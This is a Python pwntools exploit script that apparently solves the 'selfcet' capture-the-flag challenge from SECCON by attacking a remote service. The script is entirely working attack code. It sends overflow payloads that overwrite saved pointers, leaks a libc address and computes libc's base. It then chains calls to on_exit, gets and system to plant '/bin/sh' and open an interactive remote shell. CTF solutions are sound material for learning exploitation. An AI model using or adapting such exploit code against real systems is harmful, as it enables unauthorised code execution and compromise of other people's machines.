from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
e = ELF('./xor')

pl = b'a'*0x40+p64(0)+p64(0x403fd0)+p16(0xa010)

try:
    while (1):
        #io = process('./xor')
        io = remote('selfcet.seccon.games', 9999)
        io.send(pl)
        try:
            _ = io.recvuntil(b'xor: ', timeout=1)
        except:
            io.close()
            continue
        if (_ == b''):
            io.close()
            continue
        libc.address = u64(io.recv(6)+b'\0\0')-libc.sym['write']
        log.info('libc: '+hex(libc.address))
        onexit = libc.sym['on_exit']
        pl = b'a'*0x20+p64(0)+p64(e.sym['main'])+p64(onexit)
        #gdb.attach(io)
        io.send(pl)
        pause()
        pl = b'a'*0x40+p64(0)+p64(e.bss())+p64(libc.sym['gets'])
        io.send(pl)
        pause()
        io.sendline(b'/bin/sh\0')
        pl = b'a'*0x20+p64(0)+p64(e.bss())+p64(libc.sym['system'])
        pause()
        io.send(pl)
        io.interactive()
except KeyboardInterrupt:
    exit(1)